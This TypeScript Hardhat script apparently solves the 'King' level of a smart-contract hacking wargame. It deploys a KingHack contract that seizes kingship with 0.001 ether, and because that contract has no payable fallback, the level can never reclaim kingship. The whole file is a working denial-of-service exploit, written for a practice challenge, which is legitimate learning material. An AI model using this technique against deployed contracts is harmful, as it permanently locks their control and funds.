import { fail } from "assert";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

const INSERT_COIN = ethers.utils.parseEther("0.001");

async function kingExploit() {
  const kingContractAddress = process.env.KING_ADDRESS || fail("KING_ADDRESS Not Found In .env");
  const [attacker] = await ethers.getSigners();
  const king = await ethers.getContractAt("King", kingContractAddress);
  const KingHack = await ethers.getContractFactory("KingHack");
  const kingHack = await KingHack.connect(attacker).deploy();

  console.log(`KingHack contract deployed at : ${kingHack.address}`);

  console.log("Performing hack ...");

  console.log("King To Be : ", kingHack.address);
  console.log("King Before Hack : ", await king._king());

  // Perform hack. This causes the KingHack contract to assume kingship of the King contract.
  // Since the KingHack contract does not have receive or payable fallback functions, level cannot reclaim kingship.
  const tx = await kingHack.hack(king.address, { value: INSERT_COIN });
  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  await tx.wait();

  console.log("King After Hack : ", await king._king());

  console.log(`SUCCESS!!! Submit the instance.`);
}

kingExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
